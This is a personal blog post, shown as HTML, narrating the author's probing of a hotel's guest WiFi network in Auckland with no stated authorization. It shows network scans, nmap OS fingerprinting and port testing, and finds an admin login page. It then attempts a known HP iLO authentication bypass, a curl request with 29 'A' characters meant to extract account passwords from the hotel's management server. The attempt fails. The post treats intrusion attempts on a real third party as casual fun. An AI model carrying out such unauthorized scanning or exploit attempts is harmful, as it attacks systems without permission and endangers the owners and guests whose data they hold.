<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Hotel Hacking | Mark Honeychurch</title>
    <meta name="description" content="Coder, Skeptic, Humanist">
    <meta name="generator" content="VuePress 1.3.0">
    <link rel="apple-touch-icon" sizes="180x180" href="/media/images/icons/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/media/images/icons/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/media/images/icons/favicon-16x16.png">
  <link rel="manifest" href="/media/images/icons/site.webmanifest">
  <link rel="shortcut icon" href="/media/images/icons/favicon.ico">
  <meta name="msapplication-TileColor" content="#b91d47">
  <meta name="msapplication-config" content="/media/images/icons/browserconfig.xml">
  <meta name="theme-color" content="#ffffff">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css">
  <link rel="alternate" type="application/rss+xml" href="https://mark.honeychurch.org/rss.xml" title="Mark Honeychurch RSS Feed">
  <link rel="alternate" type="application/atom+xml" href="https://mark.honeychurch.org/feed.atom" title="Mark Honeychurch Atom Feed">
  <link rel="alternate" type="application/json" href="https://mark.honeychurch.org/feed.json" title="Mark Honeychurch JSON Feed">
    <meta property="article:published_time" content="2019-08-25T00:00:00.000Z"><meta property="og:site_name" content="Mark Honeychurch"><meta property="og:title" content="Hotel Hacking"><meta property="og:description" content="I&#39;m sitting here in my hotel room in Auckland, having driven a long way today - but I&#39;m not tired. I&#39;ve just connected to the hotel&#39;s free WiFi, which gets me thinking about a hotel I stayed in about 10 years ago in Brisbane, where I found that all the hotel&#39;s documents were accessible on an open SMB share on the wireless network. Hmmm, I wonder what the security&#39;s like here."><meta property="og:type" content="article"><meta property="og:url" content="/blog/projects/hotel/"><meta property="og:image" content="/media/images/blog/projects/hotel.jpg"><meta name="twitter:title" content="Hotel Hacking"><meta name="twitter:description" content="I&#39;m sitting here in my hotel room in Auckland, having driven a long way today - but I&#39;m not tired. I&#39;ve just connected to the hotel&#39;s free WiFi, which gets me thinking about a hotel I stayed in about 10 years ago in Brisbane, where I found that all the hotel&#39;s documents were accessible on an open SMB share on the wireless network. Hmmm, I wonder what the security&#39;s like here."><meta name="twitter:url" content="/blog/projects/hotel/"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="/media/images/blog/projects/hotel.jpg"><meta name="twitter:label1" content="Written by"><meta name="twitter:creator" content="@markhoney"><meta name="twitter:label2" content="Filed under"><meta name="twitter:data2" content="Hotel"><meta property="article:tag" content="Hotel">
    <link rel="preload" href="/assets/css/0.styles.css" as="style"><link rel="preload" href="/assets/js/styles.js" as="script"><link rel="preload" href="/assets/js/app.js" as="script"><link rel="preload" href="/assets/js/18.js" as="script"><link rel="preload" href="/assets/js/1.js" as="script"><link rel="preload" href="/assets/js/14.js" as="script">
    <link rel="stylesheet" href="/assets/css/0.styles.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container no-sidebar"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">Mark Honeychurch</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">
  Home
</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Blog" class="dropdown-title"><span class="title">Blog</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/blog/life/" class="nav-link">
  Life
</a></li><li class="dropdown-item"><!----> <a href="/blog/random/" class="nav-link">
  Random
</a></li><li class="dropdown-item"><!----> <a href="/blog/code/" class="nav-link">
  Code
</a></li><li class="dropdown-item"><!----> <a href="/blog/howto/" class="nav-link">
  How To
</a></li><li class="dropdown-item"><!----> <a href="/blog/projects/" class="nav-link router-link-active">
  Projects
</a></li><li class="dropdown-item"><h4>
          Skeptical Thoughts
        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/blog/skepticism/2015/" class="nav-link">
  2015
</a></li><li class="dropdown-subitem"><a href="/blog/skepticism/2016/" class="nav-link">
  2016
</a></li><li class="dropdown-subitem"><a href="/blog/skepticism/2017/" class="nav-link">
  2017
</a></li><li class="dropdown-subitem"><a href="/blog/skepticism/2018/" class="nav-link">
  2018
</a></li></ul></li></ul></div></div><div class="nav-item"><a href="/media/" class="nav-link">
  Media
</a></div><div class="nav-item"><a href="/cv/" class="nav-link">
  CV
</a></div><div class="nav-item"><a href="/contact/" class="nav-link">
  Contact
</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">
  Home
</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Blog" class="dropdown-title"><span class="title">Blog</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/blog/life/" class="nav-link">
  Life
</a></li><li class="dropdown-item"><!----> <a href="/blog/random/" class="nav-link">
  Random
</a></li><li class="dropdown-item"><!----> <a href="/blog/code/" class="nav-link">
  Code
</a></li><li class="dropdown-item"><!----> <a href="/blog/howto/" class="nav-link">
  How To
</a></li><li class="dropdown-item"><!----> <a href="/blog/projects/" class="nav-link router-link-active">
  Projects
</a></li><li class="dropdown-item"><h4>
          Skeptical Thoughts
        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/blog/skepticism/2015/" class="nav-link">
  2015
</a></li><li class="dropdown-subitem"><a href="/blog/skepticism/2016/" class="nav-link">
  2016
</a></li><li class="dropdown-subitem"><a href="/blog/skepticism/2017/" class="nav-link">
  2017
</a></li><li class="dropdown-subitem"><a href="/blog/skepticism/2018/" class="nav-link">
  2018
</a></li></ul></li></ul></div></div><div class="nav-item"><a href="/media/" class="nav-link">
  Media
</a></div><div class="nav-item"><a href="/cv/" class="nav-link">
  CV
</a></div><div class="nav-item"><a href="/contact/" class="nav-link">
  Contact
</a></div> <!----></nav>  <!----> </aside> <main class="page"><div data-v-9aff53ca><!----> <h2 data-v-9aff53ca>Hotel Hacking</h2> <h4 data-v-9aff53ca>25 August 2019</h4> <p data-v-9aff53ca><!----> <em>Categories:</em> <span><a href="/blog/category/?name=Hack">Hack<!----></a></span> , <em>Tags:</em> <span><a href="/blog/tag/?name=Hotel">Hotel<!----></a></span></p></div> <div class="theme-default-content content__default"><p>I'm sitting here in my hotel room in Auckland, having driven a long way today - but I'm not tired. I've just connected to the hotel's free WiFi, which gets me thinking about a hotel I stayed in about 10 years ago in Brisbane, where I found that all the hotel's documents were accessible on an open SMB share on the wireless network. Hmmm, I wonder what the security's like here.</p> <h2 id="ipconfig"><a href="#ipconfig" class="header-anchor">#</a> IPConfig</h2> <p>Okay, so let's start by checking out what IP I've been given by the hotel DHCP, and what the gateway address is. We do this in Windows by running <code>ipconfig</code>.</p> <p>The ipconfig command spits out a lot of text, but we're mainly interested in the Wireless LAN adapter and its Default Gateway (which I've highlighted below):</p> <div class="language-powershell extra-class"><pre class="language-powershell"><code><span class="token function">PS</span> C:\&gt; ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Media State <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> : Media disconnected
   Connection<span class="token operator">-</span>specific DNS Suffix  <span class="token punctuation">.</span> :

Mobile Broadband adapter Cellular:

   Media State <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> : Media disconnected
   Connection<span class="token operator">-</span>specific DNS Suffix  <span class="token punctuation">.</span> :

Wireless LAN adapter Wi<span class="token operator">-</span>Fi:

   Connection<span class="token operator">-</span>specific DNS Suffix  <span class="token punctuation">.</span> :
   Link<span class="token operator">-</span>local IPv6 Address <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> : fe80::5497:f277:a7e0:9a13<span class="token operator">%</span>18
   IPv4 Address<span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> : 10<span class="token punctuation">.</span>100<span class="token punctuation">.</span>3<span class="token punctuation">.</span>112
   Subnet Mask <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> : 255<span class="token punctuation">.</span>255<span class="token punctuation">.</span>248<span class="token punctuation">.</span>0
   Default Gateway <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> : 10<span class="token punctuation">.</span>100<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1

Ethernet adapter Bluetooth Network Connection:

   Media State <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> : Media disconnected
   Connection<span class="token operator">-</span>specific DNS Suffix  <span class="token punctuation">.</span> :
</code></pre></div><h2 id="angry-ip-scanner"><a href="#angry-ip-scanner" class="header-anchor">#</a> Angry IP Scanner</h2> <p>Okay, so first things first - we can use <a href="https://angryip.org/" target="_blank" rel="noopener noreferrer">Angry IP Scanner<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> to check for other machines on the network. This could be either other customers' devices or other hotel servers or devices.</p> <p><img src="/assets/img/angry.jpg" alt="Angry IP Scanner"></p> <h2 id="traceroute"><a href="#traceroute" class="header-anchor">#</a> TraceRoute</h2> <p>We can also use <code>tracert</code> to find out what devices there are beyond our local gateway. A traceroute can show us the IP of each device our data goes through on the way to a destination IP. In this instance, we'll start a traceroute to CloudFlare's DNS server at <a href="https://1.1.1.1/" target="_blank" rel="noopener noreferrer">1.1.1.1<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>, and we'll turn off resolution of IP addresses to host names with -d (because it slows traceroute down a lot).</p> <div class="language-powershell extra-class"><pre class="language-powershell"><code><span class="token function">PS</span> C:\&gt; tracert <span class="token operator">-</span>d 1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1

Tracing route to 1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1 over a maximum of 30 hops

  1    &lt;1 ms     1 ms     1 ms  10<span class="token punctuation">.</span>100<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1
  2     1 ms     1 ms     1 ms  203<span class="token punctuation">.</span>167<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>xxx
  3     3 ms     2 ms     2 ms  203<span class="token punctuation">.</span>97<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>xxx
  4     3 ms     3 ms     2 ms  198<span class="token punctuation">.</span>41<span class="token punctuation">.</span>236<span class="token punctuation">.</span>254
  5     3 ms     2 ms     3 ms  198<span class="token punctuation">.</span>41<span class="token punctuation">.</span>236<span class="token punctuation">.</span>253
  6     2 ms     2 ms     2 ms  1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1
</code></pre></div><p>The second hop in our traceroute looks interesting - and is probably worth checking out further.</p> <h2 id="nmap"><a href="#nmap" class="header-anchor">#</a> NMap</h2> <p>To probe further, let's run an <code>nmap</code> scan on our first IP address. nmap can check for open ports on an IP, and we can also use the -O switch to see if nmap can additionally figure out which OS the machine may be running.</p> <div class="language-powershell extra-class"><pre class="language-powershell"><code><span class="token function">PS</span> C:\&gt; nmap <span class="token operator">-</span>O 10<span class="token punctuation">.</span>100<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1

Starting Nmap 7<span class="token punctuation">.</span>80 <span class="token punctuation">(</span> https:<span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org <span class="token punctuation">)</span> at 2019<span class="token operator">-</span>08<span class="token operator">-</span>25 23:22 New Zealand Standard Time
Nmap scan report <span class="token keyword">for</span> 10<span class="token punctuation">.</span>100<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1
Host is up <span class="token punctuation">(</span>0<span class="token punctuation">.</span>0020s latency<span class="token punctuation">)</span><span class="token punctuation">.</span>
Not shown: 992 closed ports
PORT     STATE    SERVICE
22<span class="token operator">/</span>tcp   filtered ssh
80<span class="token operator">/</span>tcp   open     http
81<span class="token operator">/</span>tcp   open     hosts2<span class="token operator">-</span>ns
443<span class="token operator">/</span>tcp  open     https
444<span class="token operator">/</span>tcp  open     snpp
1001<span class="token operator">/</span>tcp open     webpush
3128<span class="token operator">/</span>tcp open     squid<span class="token operator">-</span>http
8080<span class="token operator">/</span>tcp open     http<span class="token operator">-</span>proxy
MAC Address: 40:A8:F0:36:xx:xx <span class="token punctuation">(</span>Hewlett Packard<span class="token punctuation">)</span>
No exact OS matches <span class="token keyword">for</span> host <span class="token punctuation">(</span><span class="token keyword">If</span> you know what OS is running on it<span class="token punctuation">,</span> see https:<span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org<span class="token operator">/</span>submit<span class="token operator">/</span> <span class="token punctuation">)</span><span class="token punctuation">.</span>
TCP<span class="token operator">/</span>IP fingerprint:
OS:SCAN<span class="token punctuation">(</span>V=7<span class="token punctuation">.</span>80<span class="token operator">%</span>E=4<span class="token operator">%</span>D=8<span class="token operator">/</span>25<span class="token operator">%</span>OT=80<span class="token operator">%</span>CT=1<span class="token operator">%</span>CU=34038<span class="token operator">%</span>PV=Y<span class="token operator">%</span>DS=1<span class="token operator">%</span>DC=D<span class="token operator">%</span>G=Y<span class="token operator">%</span>M=40A8F0<span class="token operator">%</span>T
OS:M=5D626F7F<span class="token operator">%</span>P=i686<span class="token operator">-</span>pc<span class="token operator">-</span>windows<span class="token operator">-</span>windows<span class="token punctuation">)</span>SEQ<span class="token punctuation">(</span><span class="token function">SP</span>=109<span class="token operator">%</span>GCD=1<span class="token operator">%</span>ISR=10A<span class="token operator">%</span>TI=Z<span class="token operator">%</span>CI=Z<span class="token operator">%</span>
OS:<span class="token function">II</span>=I<span class="token operator">%</span>TS=U<span class="token punctuation">)</span>SEQ<span class="token punctuation">(</span>CI=Z<span class="token operator">%</span><span class="token function">II</span>=I<span class="token operator">%</span>TS=U<span class="token punctuation">)</span>OPS<span class="token punctuation">(</span>O1=M5B4NWA<span class="token operator">%</span>O2=M5B4NWA<span class="token operator">%</span>O3=M5B4NWA<span class="token operator">%</span>O4=M5B
OS:4NWA<span class="token operator">%</span>O5=M5B4NWA<span class="token operator">%</span>O6=M5B4<span class="token punctuation">)</span>WIN<span class="token punctuation">(</span>W1=7210<span class="token operator">%</span>W2=7210<span class="token operator">%</span>W3=7210<span class="token operator">%</span>W4=7210<span class="token operator">%</span>W5=7210<span class="token operator">%</span>W6=7
OS:210<span class="token punctuation">)</span>ECN<span class="token punctuation">(</span>R=Y<span class="token operator">%</span>DF=Y<span class="token operator">%</span>T=40<span class="token operator">%</span>W=7210<span class="token operator">%</span>O=M5B4NWA<span class="token operator">%</span>CC=Y<span class="token operator">%</span>Q=<span class="token punctuation">)</span>T1<span class="token punctuation">(</span>R=Y<span class="token operator">%</span>DF=Y<span class="token operator">%</span>T=40<span class="token operator">%</span>S=O<span class="token operator">%</span>A=S<span class="token operator">+</span>
OS:<span class="token operator">%</span>F=AS<span class="token operator">%</span><span class="token function">RD</span>=0<span class="token operator">%</span>Q=<span class="token punctuation">)</span>T2<span class="token punctuation">(</span>R=N<span class="token punctuation">)</span>T3<span class="token punctuation">(</span>R=N<span class="token punctuation">)</span>T4<span class="token punctuation">(</span>R=Y<span class="token operator">%</span>DF=Y<span class="token operator">%</span>T=40<span class="token operator">%</span>W=0<span class="token operator">%</span>S=A<span class="token operator">%</span>A=Z<span class="token operator">%</span>F=R<span class="token operator">%</span>O=<span class="token operator">%</span><span class="token function">RD</span>=0<span class="token operator">%</span>Q=<span class="token punctuation">)</span>
OS:T5<span class="token punctuation">(</span>R=Y<span class="token operator">%</span>DF=Y<span class="token operator">%</span>T=40<span class="token operator">%</span>W=0<span class="token operator">%</span>S=Z<span class="token operator">%</span>A=S+<span class="token operator">%</span>F=AR<span class="token operator">%</span>O=<span class="token operator">%</span><span class="token function">RD</span>=0<span class="token operator">%</span>Q=<span class="token punctuation">)</span>T6<span class="token punctuation">(</span>R=Y<span class="token operator">%</span>DF=Y<span class="token operator">%</span>T=40<span class="token operator">%</span>W=0<span class="token operator">%</span>S=A<span class="token operator">%</span>A
OS:=Z<span class="token operator">%</span>F=R<span class="token operator">%</span>O=<span class="token operator">%</span><span class="token function">RD</span>=0<span class="token operator">%</span>Q=<span class="token punctuation">)</span>T7<span class="token punctuation">(</span>R=Y<span class="token operator">%</span>DF=Y<span class="token operator">%</span>T=40<span class="token operator">%</span>W=0<span class="token operator">%</span>S=Z<span class="token operator">%</span>A=S+<span class="token operator">%</span>F=AR<span class="token operator">%</span>O=<span class="token operator">%</span><span class="token function">RD</span>=0<span class="token operator">%</span>Q=<span class="token punctuation">)</span>U1<span class="token punctuation">(</span>R=Y<span class="token operator">%</span>D
OS:F=N<span class="token operator">%</span>T=40<span class="token operator">%</span>IPL=164<span class="token operator">%</span>UN=0<span class="token operator">%</span>RIPL=G<span class="token operator">%</span>RID=G<span class="token operator">%</span>RIPCK=G<span class="token operator">%</span>RUCK=G<span class="token operator">%</span>RUD=G<span class="token punctuation">)</span>IE<span class="token punctuation">(</span>R=Y<span class="token operator">%</span>DFI=N<span class="token operator">%</span>T=4
OS:0<span class="token operator">%</span>CD=S<span class="token punctuation">)</span>

Network Distance: 1 hop

OS detection performed<span class="token punctuation">.</span> Please report any incorrect results at https:<span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org<span class="token operator">/</span>submit<span class="token operator">/</span> <span class="token punctuation">.</span>
Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned in 16<span class="token punctuation">.</span>57 seconds
</code></pre></div><p>Okay, so we know that this is an HP server, and is likely running MS Windows. We can see that a bunch of ports are open, so let's see what we can find out.</p> <h3 id="remote-terminal"><a href="#remote-terminal" class="header-anchor">#</a> Remote terminal</h3> <h4 id="port-22-ssh"><a href="#port-22-ssh" class="header-anchor">#</a> Port 22 - SSH</h4> <p>Starting with port 22, which is open but filtered, we can use the <code>ssh</code> tool to test for an SSH shell - although methinks we won't have much luck accessing that port:</p> <div class="language-powershell extra-class"><pre class="language-powershell"><code><span class="token function">PS</span> C:\&gt; ssh 10<span class="token punctuation">.</span>100<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1`

ssh: connect to host 10<span class="token punctuation">.</span>100<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1 port 22: Connection timed out
</code></pre></div><h3 id="web-server"><a href="#web-server" class="header-anchor">#</a> Web Server</h3> <p>It looks like this server is running not only a web server on ports 80 (HTTP) and 443 (encrypted HTTPS), but also likely a second web server, maybe for an admin interface, on incremented ports 81 and 444. Port 3128, as nmap tells us, is a Squid Proxy port, and also port 8080 is often used for proxies (as well as local web services built on NodeJS, Python, etc.). Let's see what happens when we try to connect to these ports:</p> <h4 id="port-80-redirect"><a href="#port-80-redirect" class="header-anchor">#</a> Port 80 - Redirect</h4> <p>Port 80 redirects us to the hotel's homepage:</p> <p><img src="/assets/img/80.jpg" alt="Port 80"></p> <h4 id="port-81-http"><a href="#port-81-http" class="header-anchor">#</a> Port 81 - HTTP</h4> <p>Port 81 tells us to sod off:</p> <p><img src="/assets/img/81.jpg" alt="Port 81"></p> <p>A quick test of various paths (/admin, /login, /config, etc.) gives us a bunch of not found errors:</p> <p><img src="/assets/img/81admin.jpg" alt="Port 81 /admin"></p> <h4 id="port-443-redirect"><a href="#port-443-redirect" class="header-anchor">#</a> Port 443 - Redirect</h4> <p>Port 443 does the same as port 80 above, redirecting us 😦.</p> <h4 id="port-444-admin-interface"><a href="#port-444-admin-interface" class="header-anchor">#</a> Port 444 - Admin Interface</h4> <p>Although port 444 redirects us to the hotel homepage, digging a little further shows that visiting the /admin path gives us a login page:</p> <p><img src="/assets/img/444.jpg" alt="Port 444"></p> <p>Yay, we've finally got somewhere. At this point, we'll leave this and move on to the next set of ports, rather than risking getting in trouble.</p> <h4 id="port-1001"><a href="#port-1001" class="header-anchor">#</a> Port 1001</h4> <p>Port 1001 doesn't give us anything useful in a browser, and <code>telnet</code> and <code>netcat</code> don't give us anything useful either:</p> <p><img src="/assets/img/1001.jpg" alt="Port 1001"></p> <div class="language-powershell extra-class"><pre class="language-powershell"><code><span class="token function">PS</span> C:\&gt; nc 10<span class="token punctuation">.</span>100<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1 1001

<span class="token function">PS</span> C:\&gt;
</code></pre></div><h4 id="port-3128"><a href="#port-3128" class="header-anchor">#</a> Port 3128</h4> <p>Port 3128 gives us a Squid error page, and usefully it also gives us a server name.</p> <p><img src="/assets/img/3128.jpg" alt="Port 3128"></p> <h4 id="port-8080"><a href="#port-8080" class="header-anchor">#</a> Port 8080</h4> <p>Port 8080 gives us the same Squid error page as port 3128.</p> <p><img src="/assets/img/8080.jpg" alt="Port 8080"></p> <p>A google search for the server name we just found at the bottom of the Squid error page turns up something interesting - a single result for an open iLO server:</p> <p><img src="/assets/img/google.jpg" alt="Google Server Name Search"></p> <h3 id="integrated-lights-out"><a href="#integrated-lights-out" class="header-anchor">#</a> Integrated Lights Out</h3> <p>iLO is Integrated Lights Out, and is a piece of management hardware in most HP servers which allows admins to manage servers remotely. If this is open to the internet, that's probably not a good idea, especially given that many versions of iLO have a <a href="https://www.bleepingcomputer.com/news/security/you-can-bypass-authentication-on-hpe-ilo4-servers-with-29-a-characters/" target="_blank" rel="noopener noreferrer">known security flaw<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>:</p> <blockquote><p>Last year, a trio of security researchers discovered such a vulnerability, which they say it can be exploited remotely, via an Internet connection, putting all iLO servers exposed online at risk.</p> <p>The vulnerability is an authentication bypass that allows attackers access to HP iLO consoles. Researchers say this access can later be used to extract cleartext passwords, execute malicious code, and even replace iLO firmware.</p> <p>But besides being a remotely exploitable flaw, this vulnerability is also as easy as it gets when it comes to exploitation, requiring a cURL request and 29 letter &quot;A&quot; characters</p></blockquote> <p>Wow! So, all we need to do to get a list of users and passwords for iLO is make a request to the iLO server's API and send it a bunch of &quot;A&quot;s. Let's give it a go:</p> <div class="language-batch extra-class"><pre class="language-batch"><code><span class="token command"><span class="token keyword">C</span><span class="token label property">:\&gt;curl</span> <span class="token parameter attr-name">-i</span> <span class="token parameter attr-name">-k</span> <span class="token parameter attr-name">-H</span> <span class="token string">&quot;Connection: AAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span> https://xxxxxxxx-akl-nz-lo.reivernet.com/rest/v1/AccountService<span class="token parameter attr-name">/Accounts</span></span>

<span class="token command"><span class="token keyword">curl</span>: (<span class="token number">7</span></span><span class="token punctuation">)</span> Failed to connect to xxxxxxxx-akl-nz-lo.reivernet.com port 443: Timed out
</code></pre></div><p>Damn, nothing. Just to make sure, let's test a normal request to iLO that should be actively rejected by the server:</p> <div class="language-batch extra-class"><pre class="language-batch"><code><span class="token command"><span class="token keyword">C</span><span class="token label property">:\&gt;curl</span> <span class="token parameter attr-name">-i</span> <span class="token parameter attr-name">-k</span> https://xxxxxxxx-akl-nz-lo.reivernet.com/rest/v1/AccountService<span class="token parameter attr-name">/Accounts</span></span>

<span class="token command"><span class="token keyword">curl</span>: (<span class="token number">7</span></span><span class="token punctuation">)</span> Failed to connect to xxxxxxxx-akl-nz-lo.reivernet.com port 443: Timed out
</code></pre></div><p>Hmmm, okay - nothing again. We're expecting to see some JSON formatted data. Let's just check that we can see the server by pinging it:</p> <div class="language-powershell extra-class"><pre class="language-powershell"><code><span class="token function">PS</span> C:\&gt; ping xxxxxxxx<span class="token operator">-</span>akl<span class="token operator">-</span>nz<span class="token operator">-</span>lo<span class="token punctuation">.</span>reivernet<span class="token punctuation">.</span>com
Pinging xxxxxxxx<span class="token operator">-</span>akl<span class="token operator">-</span>nz<span class="token operator">-</span>lo<span class="token punctuation">.</span>reivernet<span class="token punctuation">.</span>com <span class="token punctuation">[</span>203<span class="token punctuation">.</span>167<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>xxx<span class="token punctuation">]</span> with 32 bytes of <span class="token keyword">data</span>:
Reply <span class="token keyword">from</span> 203<span class="token punctuation">.</span>167<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>xxx: Destination host unreachable<span class="token punctuation">.</span>
Reply <span class="token keyword">from</span> 203<span class="token punctuation">.</span>167<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>xxx: Destination host unreachable<span class="token punctuation">.</span>
Reply <span class="token keyword">from</span> 203<span class="token punctuation">.</span>167<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>xxx: Destination host unreachable<span class="token punctuation">.</span>
Reply <span class="token keyword">from</span> 203<span class="token punctuation">.</span>167<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>xxx: Destination host unreachable<span class="token punctuation">.</span>

Ping statistics <span class="token keyword">for</span> 203<span class="token punctuation">.</span>167<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>xxx:
    Packets: Sent = 4<span class="token punctuation">,</span> Received = 4<span class="token punctuation">,</span> Lost = 0 <span class="token punctuation">(</span>0<span class="token operator">%</span> loss<span class="token punctuation">)</span><span class="token punctuation">,</span>
</code></pre></div><p>Okay, no ping response. Maybe they've moved the iLO port and told the server to not respond to ping requests. Let's run a quick nmap scan:</p> <div class="language-powershell extra-class"><pre class="language-powershell"><code><span class="token function">PS</span> C:\&gt; nmap <span class="token operator">-</span>O xxxxxxxx<span class="token operator">-</span>akl<span class="token operator">-</span>nz<span class="token operator">-</span>lo<span class="token punctuation">.</span>reivernet<span class="token punctuation">.</span>com

Starting Nmap 7<span class="token punctuation">.</span>80 <span class="token punctuation">(</span> https:<span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org <span class="token punctuation">)</span> at 2019<span class="token operator">-</span>08<span class="token operator">-</span>25 23:15 New Zealand Standard Time
Note: Host seems down<span class="token punctuation">.</span> <span class="token keyword">If</span> it is really up<span class="token punctuation">,</span> but blocking our ping probes<span class="token punctuation">,</span> <span class="token keyword">try</span> <span class="token operator">-</span>Pn
Nmap done: 1 IP address <span class="token punctuation">(</span>0 hosts up<span class="token punctuation">)</span> scanned in 5<span class="token punctuation">.</span>41 seconds
